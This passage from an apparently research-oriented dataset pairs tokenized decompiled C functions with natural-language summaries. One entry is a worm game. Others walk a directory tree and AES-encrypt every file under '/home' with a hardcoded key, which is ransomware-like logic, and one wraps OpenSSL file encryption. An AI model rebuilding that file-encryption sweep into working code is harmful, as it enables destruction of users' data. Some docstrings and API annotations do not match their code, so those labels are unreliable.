            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "worm_length",
            ";",
            "v3",
            "=",
            "0",
            ";",
            "v4",
            "=",
            "board",
            ";",
            "do",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "!",
            "=",
            "50",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v7",
            "=",
            "v4",
            "[",
            "i",
            "]",
            ";",
            "v6",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "1",
            ")",
            "break",
            ";",
            "v6",
            "=",
            "v0",
            ";",
            "if",
            "(",
            "v7",
            ">",
            "0",
            ")",
            "goto",
            "LABEL_7",
            ";",
            "LABEL_4",
            ":",
            "if",
            "(",
            "+",
            "+",
            "i",
            "=",
            "=",
            "50",
            ")",
            "goto",
            "LABEL_9",
            ";",
            "}",
            "v1",
            "=",
            "v3",
            ";",
            "LABEL_7",
            ":",
            "v8",
            "=",
            "v7",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v8",
            ">",
            "(",
            "int",
            ")",
            "v2",
            ")",
            "{",
            "v4",
            "[",
            "i",
            "]",
            "=",
            "0",
            ";",
            "v0",
            "=",
            "v6",
            ";",
            "goto",
            "LABEL_4",
            ";",
            "}",
            "v4",
            "[",
            "i",
            "]",
            "=",
            "v8",
            ";",
            "v0",
            "=",
            "v6",
            ";",
            "}",
            "LABEL_9",
            ":",
            "+",
            "+",
            "v3",
            ";",
            "v4",
            "+",
            "=",
            "50",
            ";",
            "}",
            "while",
            "(",
            "v3",
            "!",
            "=",
            "25",
            ")",
            ";",
            "v9",
            "=",
            "worm_dir",
            ";",
            "if",
            "(",
            "worm_dir",
            ")",
            "{",
            "if",
            "(",
            "worm_dir",
            "=",
            "=",
            "2",
            ")",
            "{",
            "+",
            "+",
            "v1",
            ";",
            "}",
            "else",
            "if",
            "(",
            "worm_dir",
            "=",
            "=",
            "1",
            ")",
            "{",
            "+",
            "+",
            "v0",
            ";",
            "}",
            "else",
            "{",
            "v0",
            "-",
            "=",
            "worm_dir",
            "=",
            "=",
            "3",
            ";",
            "}",
            "}",
            "else",
            "{",
            "-",
            "-",
            "v1",
            ";",
            "}",
            "if",
            "(",
            "v0",
            ">",
            "0x31",
            "|",
            "|",
            "v1",
            ">",
            "0x18",
            "|",
            "|",
            "(",
            "v10",
            "=",
            "board",
            "[",
            "50",
            "*",
            "v1",
            "+",
            "v0",
            "]",
            ",",
            "v10",
            ">",
            "0",
            ")",
            ")",
            "{",
            "end_game",
            "(",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v10",
            ")",
            "{",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "+",
            "1",
            ")",
            ";",
            "worm_length",
            "=",
            "v2",
            ";",
            "}",
            "v11",
            "=",
            "(",
            "int",
            ")",
            "v0",
            "+",
            "50L",
            "L",
            "*",
            "(",
            "int",
            ")",
            "v1",
            ";",
            "board",
            "[",
            "v11",
            "]",
            "=",
            "1",
            ";",
            "if",
            "(",
            "(",
            "v9",
            "&",
            "0xFFFFFFFD",
            ")",
            "!",
            "=",
            "0",
            ")",
            "update_job_interval",
            "(",
            "200L",
            "L",
            ",",
            "v4",
            ",",
            "v11",
            ",",
            "v6",
            ",",
            "v2",
            ")",
            ";",
            "else",
            "update_job_interval",
            "(",
            "300L",
            "L",
            ",",
            "v4",
            ",",
            "v11",
            ",",
            "v6",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `update_worm` which updates the position and length of a worm in a game board, handling its direction and interactions with other elements on the board while also triggering job interval updates based on specific conditions."
    },
    {
        "id": 191,
        "docstring_tokens": [
            "The",
            "code",
            "scans",
            "through",
            "a",
            "directory",
            ",",
            "encrypting",
            "or",
            "decrypting",
            "files",
            "based",
            "on",
            "the",
            "encrypt",
            "parameter",
            "using",
            "AES",
            "encryption",
            "with",
            "a",
            "given",
            "key",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ",",
            "bool",
            "encrypt",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "char",
            "*",
            "v6",
            ";",
            "DIR",
            "*",
            "dr",
            ";",
            "struct",
            "dirent",
            "*",
            "de",
            ";",
            "char",
            "v10",
            "[",
            "2072",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v10",
            ";",
            "if",
            "(",
            "_bss_start",
            ")",
            "{",
            "v4",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "2048L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 2000 8 pathName \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "scanAndCrypt",
            ";",
            "v5",
            "=",
            "v3",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "2147451132",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "path",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207220",
            ")",
            ";",
            "dr",
            "=",
            "opendir",
            "(",
            "path",
            ")",
            ";",
            "if",
            "(",
            "dr",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "de",
            "=",
            "readdir",
            "(",
            "dr",
            ")",
            ";",
            "if",
            "(",
            "!",
            "de",
            ")",
            "break",
            ";",
            "__asan_unpoison_stack_memory",
            "(",
            "v3",
            "+",
            "32",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "path",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207280",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "path",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            "+",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2072E0",
            ")",
            ";",
            "memcpy",
            "(",
            "v6",
            ",",
            "\"/\"",
            ",",
            "2uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "de",
            "=",
            "=",
            "(",
            "struct",
            "dirent",
            "*",
            ")",
            "-",
            "19L",
            "L",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207340",
            ")",
            ";",
            "strcat",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "de",
            "-",
            ">",
            "d_name",
            ")",
            ";",
            "if",
            "(",
            "de",
            "=",
            "=",
            "(",
            "struct",
            "dirent",
            "*",
            ")",
            "-",
            "19L",
            "L",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2073A0",
            ")",
            ";",
            "if",
            "(",
            "strcmp",
            "(",
            "de",
            "-",
            ">",
            "d_name",
            ",",
            "\".\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "de",
            "=",
            "=",
            "(",
            "struct",
            "dirent",
            "*",
            ")",
            "-",
            "19L",
            "L",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207400",
            ")",
            ";",
            "if",
            "(",
            "strcmp",
            "(",
            "de",
            "-",
            ">",
            "d_name",
            ",",
            "\"..\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "isFile",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ")",
            ")",
            "{",
            "if",
            "(",
            "canBeModified",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ")",
            ")",
            "printf",
            "(",
            "\"file: %s\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "scanAndCrypt",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "key",
            ",",
            "encrypt",
            ")",
            ";",
            "}",
            "}",
            "}",
            "__asan_poison_stack_memory",
            "(",
            "v3",
            "+",
            "32",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "}",
            "closedir",
            "(",
            "dr",
            ")",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Could not open current directory\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v10",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF80F8",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v5",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "256",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v3",
            ",",
            "2048L",
            "L",
            ",",
            "v10",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely implements a data structure for managing a stack, possibly in the context of a programming language runtime environment, featuring structures such as nodes for binary search trees or for JavaScript function lists, facilitating operations like pushing and popping elements.",
            "The `malloc` function is typically used for dynamic memory allocation in C programs, but in this context, it seems to have been redefined to allocate memory using `GlobalAlloc` with zero initialization, potentially for Windows programming.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from the FS segment register at a specified offset, typically used in low-level programming for accessing thread-local storage or operating system structures in x86 and x64 architectures."
        ],
        "longer_label": "The provided code appears to be a recursive function written in C that traverses a directory structure, encrypting or decrypting files based on the 'encrypt' parameter, while also managing memory allocation using custom stack-like structures and low-level operations such as reading from the FS segment register."
    },
    {
        "id": 192,
        "docstring_tokens": [
            "The",
            "main",
            "function",
            "asserts",
            "that",
            "the",
            "file",
            "``",
            "ksdkadsa",
            "''",
            "does",
            "not",
            "exist",
            ",",
            "``",
            "elise",
            "''",
            "does",
            "exist",
            ",",
            "and",
            "can",
            "not",
            "be",
            "modified",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "char",
            "v8",
            "[",
            "2072",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v8",
            ";",
            "if",
            "(",
            "_bss_start",
            ")",
            "{",
            "v4",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "2048L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 2000 4 path \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "main",
            ";",
            "v5",
            "=",
            "v3",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "2147451132",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "2031",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v3",
            "-",
            "17",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "2031",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v3",
            "+",
            "32",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "=",
            "0x656D6F682FL",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "40",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "48",
            ")",
            ",",
            "0",
            ",",
            "0x7C0uL",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "argv",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "argv",
            "=",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "-",
            "8L",
            "L",
            "|",
            "|",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "argv",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207100",
            ",",
            "argv",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v6",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "v6",
            ")",
            ";",
            "scanAndCrypt",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v6",
            "!",
            "=",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF80F8",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v5",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "256",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v3",
            ",",
            "2048L",
            "L",
            ",",
            "v8",
            ")",
            ";",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `an_stack_malloc` appears to be part of AddressSanitizer (ASan) instrumentation for detecting memory errors, likely responsible for allocating memory on the stack with varying sizes and associated metadata for error checking purposes.",
            "The `__readfsqword` function is used to read an unsigned 64-bit integer (quadword) from a specific offset within the FS segment register, primarily in low-level system programming contexts such as accessing thread information blocks or other operating system structures."
        ],
        "longer_label": "The provided code appears to be a main function with AddressSanitizer (ASan) instrumentation, allocating memory on the stack, reading from specific offsets within the FS segment register, and performing memory error checks."
    },
    {
        "id": 193,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "performs",
            "encryption",
            "or",
            "decryption",
            "using",
            "the",
            "provided",
            "parameters",
            "and",
            "EVP",
            "library",
            "functions",
            ",",
            "reading",
            "data",
            "from",
            "a",
            "plaintext",
            "file",
            ",",
            "encrypting",
            "or",
            "decrypting",
            "it",
            "using",
            "a",
            "specified",
            "cipher",
            ",",
            "and",
            "writing",
            "the",
            "result",
            "to",
            "an",
            "output",
            "file",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "Params_0",
            "*",
            "p",
            ")",
            "{",
            "Params_0",
            "*",
            "v1",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "char",
            "*",
            "*",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "void",
            "*",
            "v7",
            ";",
            "unsigned",
            "int",
            "encrypt",
            ";",
            "FILE",
            "*",
            "out",
            ";",
            "unsigned",
            "__int8",
            "*",
            "IV",
            ";",
            "FILE",
            "*",
            "plaintext",
            ";",
            "unsigned",
            "int",
            "v12",
            ";",
            "unsigned",
            "__int8",
            "*",
            "v13",
            ";",
            "FILE",
            "*",
            "v14",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "v15",
            ")",
            "[",
            "]",
            ";",
            "FILE",
            "*",
            "v16",
            ";",
            "size_t",
            "v17",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "v18",
            ")",
            "[",
            "]",
            ";",
            "_QWORD",
            "v19",
            "[",
            "4",
            "]",
            ";",
            "size_t",
            "n",
            ";",
            "__int64",
            "v21",
            ";",
            "char",
            "*",
            "v22",
            ";",
            "Params_0",
            "*",
            "pa",
            ";",
            "int",
            "num_bytes_read",
            ";",
            "int",
            "cipher_block_size",
            ";",
            "__int64",
            "v26",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "p_out_buf",
            ")",
            "[",
            "]",
            ";",
            "EVP_CIPHER_CTX",
            "*",
            "ctx",
            ";",
            "char",
            "v29",
            "[",
            "1176",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v30",
            ";",
            "pa",
            "=",
            "p",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v29",
            ";",
            "v22",
            "=",
            "v29",
            ";",
            "if",
            "(",
            "_bss_start",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "1152L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 7 out_len 96 1024 6 in_buf \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "cipher",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v4",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862755",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v30",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v19",
            "[",
            "1",
            "]",
            "=",
            "v19",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v1",
            "=",
            "pa",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207C40",
            ",",
            "pa",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "char",
            "*",
            "*",
            ")",
            "pa",
            "-",
            ">",
            "cipher",
            ";",
            "cipher_block_size",
            "=",
            "EVP_CIPHER_block_size",
            "(",
            "v5",
            ")",
            ";",
            "v6",
            "=",
            "cipher_block_size",
            "+",
            "1024",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1024",
            ",",
            "cipher_block_size",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "cipher_block_size",
            ";",
            "v5",
            "=",
            "&",
            "off_208180",
            ";",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_208180",
            ",",
            "cipher_block_size",
            ",",
            "1024L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v6",
            "<",
            "=",
            "0",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "v6",
            ";",
            "v5",
            "=",
            "&",
            "off_207C00",
            ";",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_207C00",
            ",",
            "v6",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "v6",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "v6",
            ";",
            "v5",
            "=",
            "&",
            "off_2081C0",
            ";",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_2081C0",
            ",",
            "v6",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "v26",
            "=",
            "v6",
            "-",
            "1L",
            "L",
            ";",
            "n",
            "=",
            "v6",
            ";",
            "v21",
            "=",
            "0L",
            "L",
            ";",
            "v19",
            "[",
            "2",
            "]",
            "=",
            "v6",
            ";",
            "v19",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v7",
            "=",
            "alloca",
            "(",
            "16",
            "*",
            "(",
            "(",
            "v6",
            "+",
            "15L",
            "L",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ")",
            ";",
            "p_out_buf",
            "=",
            "(",
            "unsigned",
            "__int8",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v19",
            ";",
            "num_bytes_read",
            "=",
            "100000",
            ";",
            "ctx",
            "=",
            "(",
            "EVP_CIPHER_CTX",
            "*",
            ")",
            "EVP_CIPHER_CTX_new",
            "(",
            "v5",
            ",",
            "v1",
            ",",
            "(",
            "v6",
            "+",
            "15L",
            "L",
            ")",
            "%",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207CA0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "encrypt",
            "=",
            "pa",
            "-",
            ">",
            "encrypt",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207D00",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ")",
            ";",
            "EVP_CipherInit_ex",
            "(",
            "ctx",
            ",",
            "pa",
            "-",
            ">",
            "cipher",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "encrypt",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207D60",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "if",
            "(",
            "pa",
            "-",
            ">",
            "encrypt",
            "=",
            "=",
            "1",
